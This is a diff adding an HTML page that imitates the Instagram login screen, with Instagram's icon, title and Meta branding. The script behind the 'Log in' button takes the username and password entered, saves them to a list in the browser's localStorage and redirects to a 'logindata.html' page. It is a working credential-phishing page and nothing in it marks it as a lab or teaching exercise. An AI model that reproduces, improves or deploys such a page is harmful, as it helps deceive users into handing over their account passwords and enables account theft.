@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  margin:0;
+  background:#fff;
+  font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+  display:flex;
+  justify-content:center;
+}
+.container{
+  width:100%;
+  max-width:360px;
+  padding:40px 20px;
+}
+.logo{
+  text-align:center;
+  margin:40px 0;
+}
+.logo img{
+  width:60px;
+}
+input{
+  width:100%;
+  padding:14px;
+  margin:8px 0;
+  border:1px solid #dbdbdb;
+  border-radius:6px;
+  font-size:14px;
+  background:#fafafa;
+}
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  background:#1877f2;
+  color:#fff;
+  border:none;
+  border-radius:25px;
+  font-size:16px;
+  font-weight:600;
+}
+.forgot{
+  text-align:center;
+  margin-top:18px;
+  color:#1877f2;
+  font-size:14px;
+}
+.create{
+  margin-top:80px;
+  border:1px solid #1877f2;
+  color:#1877f2;
+  background:#fff;
+}
+.meta{
+  text-align:center;
+  margin-top:20px;
+  color:#999;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+  </div>
+
+  <input id="user" placeholder="Username, email or mobile number">
+  <input id="pass" type="password" placeholder="Password">
+
+  <button onclick="login()">Log in</button>
+
+  <div class="forgot">Forgot password?</div>
+
+  <button class="create">Create new account</button>
+
+  <div class="meta">∞ Meta</div>
+</div>
+
+<script>
+function login(){
+  let logins = JSON.parse(localStorage.getItem("logins")) || [];
+
+  logins.push({
+    user: user.value,
+    password: pass.value
+  });
+
+  localStorage.setItem("logins", JSON.stringify(logins));
+  window.location.href="logindata.html";
+}
+</script>
+
+</body>
+</html>
